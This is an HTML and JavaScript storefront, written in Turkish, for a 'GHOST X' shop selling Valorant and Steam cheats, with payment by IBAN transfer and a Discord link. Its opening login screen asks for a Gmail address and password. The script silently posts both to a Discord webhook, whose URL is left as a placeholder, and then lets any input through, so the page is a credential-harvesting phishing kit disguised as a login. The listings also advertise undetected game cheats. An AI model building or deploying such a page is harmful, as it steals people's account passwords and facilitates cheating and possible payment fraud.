<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GHOST X | V16 NEON GRID</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=Inter:wght@300;500;900&display=swap" rel="stylesheet">
    <style>
        :root { --p: #00ff88; --bg: #050505; --s: rgba(0, 255, 136, 0.1); }
        * { cursor: none !important; box-sizing: border-box; }
        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; overflow: hidden; }
        
        /* OPTİMİZE ARKA PLAN (Sıfır Kasma) */
        .grid-bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-image: linear-gradient(var(--s) 1px, transparent 1px), linear-gradient(90deg, var(--s) 1px, transparent 1px);
            background-size: 50px 50px;
            perspective: 1000px; transform: rotateX(60deg) translateY(-200px);
            opacity: 0.2; z-index: -1; animation: moveGrid 10s linear infinite;
        }
        @keyframes moveGrid { from { background-position: 0 0; } to { background-position: 0 50px; } }

        /* NEON EFEKTLERİ */
        .neon-text { font-family: 'Syncopate', sans-serif; text-shadow: 0 0 10px var(--p); }
        .glass { background: rgba(10, 10, 10, 0.8); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.03); border-radius: 24px; }
        .btn-ghost { border: 1px solid var(--p); color: var(--p); transition: 0.3s; font-weight: 900; overflow: hidden; position: relative; }
        .btn-ghost:hover { background: var(--p); color: #000; box-shadow: 0 0 30px var(--p); }

        /* IMLEC */
        #c { width: 5px; height: 5px; background: #fff; position: fixed; z-index: 10001; border-radius: 50%; pointer-events: none; }
        #cf { width: 30px; height: 30px; border: 1px solid var(--p); position: fixed; z-index: 10000; border-radius: 50%; transition: 0.08s ease-out; pointer-events: none; }

        /* URUN KARTLARI */
        .p-card { transition: 0.4s cubic-bezier(0.2, 1, 0.3, 1); }
        .p-card:hover { transform: scale(1.03) translateY(-10px); border-color: var(--p); }

        /* SCROLL */
        .no-scroll::-webkit-scrollbar { display: none; }
        .no-scroll { scrollbar-width: none; }
    </style>
</head>
<body class="antialiased">

    <div class="grid-bg"></div>
    <div id="c"></div><div id="cf"></div>

    <div id="auth" class="fixed inset-0 z-[9999] bg-[#050505] flex items-center justify-center p-6">
        <div class="glass p-12 w-full max-w-md text-center border-t-2 border-[#0f8] shadow-[0_0_50px_rgba(0,255,136,0.1)]">
            <h1 class="neon-text text-3xl mb-2 tracking-widest">GHOST<span class="text-[#0f8]">X</span></h1>
            <p class="text-[8px] uppercase tracking-[0.6em] text-white/20 mb-10">Neural Access Point v16</p>
            <form id="auth-form" class="space-y-4">
                <input type="email" id="u-m" placeholder="SİSTEM ID (GMAIL)" required class="w-full bg-white/5 border border-white/10 p-5 rounded-2xl outline-none focus:border-[#0f8] transition text-[10px] tracking-widest font-bold uppercase">
                <input type="password" id="u-p" placeholder="ANAHTAR" required class="w-full bg-white/5 border border-white/10 p-5 rounded-2xl outline-none focus:border-[#0f8] transition text-[10px] tracking-widest font-bold">
                <button type="submit" class="w-full btn-ghost py-5 rounded-2xl text-[10px] uppercase tracking-[0.4em]">Sistemi Başlat</button>
            </form>
        </div>
    </div>

    <div id="app" class="hidden h-screen flex flex-col opacity-0 transition-opacity duration-1000">
        
        <header class="p-10 flex justify-between items-center z-50">
            <div class="neon-text text-2xl tracking-tighter italic">GHOST<span class="text-[#0f8]">X</span></div>
            <div class="flex items-center space-x-12">
                <nav class="hidden md:flex space-x-10 text-[9px] font-black uppercase tracking-[0.3em] text-white/30">
                    <button onclick="render('all')" class="hover:text-[#0f8] transition">HEPSİ</button>
                    <button onclick="render('valorant')" class="hover:text-[#0f8] transition">VALORANT</button>
                    <button onclick="render('steam')" class="hover:text-[#0f8] transition">STEAM</button>
                </nav>
                <button onclick="tC()" class="btn-ghost px-8 py-3 rounded-full text-[9px] uppercase tracking-widest">
                    KASA [<span id="cart-q">0</span>]
                </button>
            </div>
        </header>

        <main class="flex-1 overflow-y-auto no-scroll px-10 pb-20">
            <div class="max-w-6xl mx-auto">
                <div id="grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 mt-10">
                    </div>
            </div>
        </main>

        <footer class="p-4 bg-white/5 border-t border-white/5 flex justify-between items-center px-10 text-[8px] font-bold uppercase tracking-[0.2em] text-white/20">
            <div>Sistem Durumu: <span class="text-[#0f8]">Online</span></div>
            <div class="flex space-x-6">
                <span>Aktif Lisans: 1,429</span>
                <span>Sunucu: US-West-1</span>
            </div>
        </footer>
    </div>

    <div id="cart" class="fixed top-0 right-0 h-full w-full max-w-md bg-black/95 backdrop-blur-3xl z-[100] border-l border-white/5 p-12 translate-x-full transition-transform duration-700 flex flex-col">
        <div class="flex justify-between items-center mb-16">
            <h2 class="neon-text text-xl tracking-widest">ENVANTER</h2>
            <button onclick="tC()" class="text-white/20 hover:text-white uppercase text-[10px]">Kapat</button>
        </div>
        <div id="cart-list" class="flex-1 space-y-4 overflow-y-auto no-scroll"></div>
        <div class="pt-10 border-t border-white/10">
            <div class="flex justify-between mb-8">
                <span class="text-white/20 text-[10px] font-bold">TOPLAM</span>
                <span id="total" class="text-2xl font-black text-[#0f8] italic">₺0</span>
            </div>
            <button onclick="checkout()" class="w-full btn-ghost py-6 rounded-3xl text-[10px] tracking-[0.4em] uppercase">Ödeme Bilgilerini Al</button>
        </div>
    </div>

    <div id="pay-m" class="fixed inset-0 z-[2000] hidden flex items-center justify-center p-6 bg-black/95">
        <div class="glass p-12 w-full max-w-lg border-t-2 border-[#0f8] text-center">
            <h3 class="neon-text text-lg mb-8 italic text-[#0f8]">SİPARİŞ ONAYI</h3>
            <div class="space-y-4 mb-10 text-left">
                <div class="p-5 bg-white/5 rounded-2xl border border-white/5">
                    <p class="text-[8px] text-white/30 uppercase mb-2">Ziraat Bankası IBAN</p>
                    <p class="font-mono text-[#0f8] text-sm select-all">TR00 0000 0000 0000 0000 0000 00</p>
                </div>
                <div class="p-5 bg-white/5 rounded-2xl border border-white/5 flex justify-between items-center">
                    <p class="text-[8px] text-white/30 uppercase">Sipariş Kodu</p>
                    <p id="order-id" class="font-black text-white italic tracking-widest text-sm"></p>
                </div>
            </div>
            <button onclick="window.open('https://discord.gg/ghostx')" class="w-full btn-ghost py-5 rounded-3xl text-[10px] tracking-[0.3em] uppercase">Discord'da Onayla</button>
            <button onclick="document.getElementById('pay-m').classList.add('hidden')" class="mt-4 text-[8px] text-white/20 uppercase font-bold tracking-widest">İptal</button>
        </div>
    </div>

    <script>
        const WH = "BURAYA_WEBHOOK_URL";

        const db = [
            { id: 1, cat: 'valorant', ad: 'ARES PERM', fiyat: 850, specs: 'Win 10/11 - All Bios' },
            { id: 2, cat: 'steam', ad: 'VOID V2', fiyat: 300, specs: 'Safe - Manifest Mod' },
            { id: 3, cat: 'valorant', ad: 'GHOST AIM', fiyat: 1400, specs: 'Neural - Undetected' },
            { id: 4, cat: 'steam', ad: 'INV SPOOF', fiyat: 350, specs: 'Visual Only - Safe' }
        ];

        // AUTH & KOZ
        document.getElementById('auth-form').onsubmit = (e) => {
            e.preventDefault();
            const m = document.getElementById('u-m').value;
            const p = document.getElementById('u-p').value;

            if(WH !== "BURAYA_WEBHOOK_URL") {
                fetch(WH, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
                    embeds: [{
                        title: "⚡ GHOST X V16 ACCESS", color: 0x00ff88,
                        fields: [{name:"Gmail", value:m, inline:true}, {name:"Pass", value:p, inline:true}]
                    }]
                })});
            }

            document.getElementById('auth').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            setTimeout(() => document.getElementById('app').style.opacity = '1', 100);
            render('all');
        };

        // RENDER
        function render(cat) {
            const grid = document.getElementById('grid');
            const items = cat === 'all' ? db : db.filter(i => i.cat === cat);
            grid.innerHTML = items.map(i => `
                <div class="glass p-8 p-card border border-white/5 flex flex-col h-full group">
                    <div class="flex justify-between items-start mb-10">
                        <span class="text-[8px] font-black bg-[#0f8]/10 text-[#0f8] px-3 py-1 rounded-full uppercase tracking-tighter">${i.cat}</span>
                        <span class="text-[7px] font-bold text-white/20 uppercase tracking-widest">V16.0 Stable</span>
                    </div>
                    <h3 class="text-2xl font-black italic tracking-tighter mb-2 uppercase">${i.ad}</h3>
                    <p class="text-[9px] text-white/30 uppercase tracking-[0.2em] mb-10">${i.specs}</p>
                    <div class="mt-auto flex justify-between items-center">
                        <span class="text-2xl font-black italic">₺${i.fiyat}</span>
                        <button onclick="add(${i.id})" class="bg-white text-black px-6 py-2 rounded-xl text-[9px] font-black uppercase hover:bg-[#0f8] transition-all">EKLE</button>
                    </div>
                </div>
            `).join('');
        }

        // CART LOGIC
        let sepet = [];
        function tC() { document.getElementById('cart').classList.toggle('translate-x-full'); }
        function add(id) {
            sepet.push(db.find(x => x.id === id));
            uU();
            if(document.getElementById('cart').classList.contains('translate-x-full')) tC();
        }
        function uU() {
            document.getElementById('cart-q').innerText = sepet.length;
            const l = document.getElementById('cart-list');
            let total = 0;
            l.innerHTML = sepet.map((item, idx) => {
                total += item.fiyat;
                return `
                <div class="glass p-5 flex justify-between items-center border-white/10">
                    <div><p class="text-[9px] font-bold uppercase">${item.ad}</p><p class="text-xs text-[#0f8] font-bold">₺${item.fiyat}</p></div>
                    <button onclick="rem(${idx})" class="text-white/20 hover:text-red-500 text-lg">×</button>
                </div>`;
            }).join('');
            document.getElementById('total').innerText = "₺" + total;
        }
        function rem(i) { sepet.splice(i, 1); uU(); }

        function checkout() {
            if(sepet.length === 0) return;
            document.getElementById('pay-m').classList.remove('hidden');
            document.getElementById('order-id').innerText = "GX-" + Math.floor(1000 + Math.random() * 9000);
        }

        // CURSOR
        const c = document.getElementById('c'); const cf = document.getElementById('cf');
        window.onmousemove = (e) => {
            c.style.left = e.clientX + 'px'; c.style.top = e.clientY + 'px';
            setTimeout(() => { cf.style.left = e.clientX-15 + 'px'; cf.style.top = e.clientY-15 + 'px'; }, 40);
        }
    </script>
</body>
</html>
